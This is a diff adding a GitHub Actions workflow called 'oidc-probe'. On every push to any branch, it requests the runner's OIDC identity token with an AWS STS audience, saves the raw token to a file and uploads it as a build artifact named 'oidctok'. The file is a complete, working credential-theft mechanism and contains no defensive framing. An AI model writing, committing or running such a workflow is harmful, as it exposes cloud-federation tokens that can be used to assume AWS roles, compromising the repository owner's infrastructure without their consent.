@@ -1,0 +1,24 @@
+name: oidc-probe
+on:
+  push:
+    branches: ["**"]
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: dump oidc token
+        run: |
+          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" > /tmp/tok.json
+          python3 -c "import json;d=json.load(open('/tmp/tok.json'));print('TOKEN_LEN',len(d.get('value','')));open('/tmp/oidc.txt','w').write(d.get('value',''))"
+          echo "TOKEN_FILE /tmp/oidc.txt"
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: oidctok
+          path: /tmp/oidc.txt
+          if-no-files-found: ignore
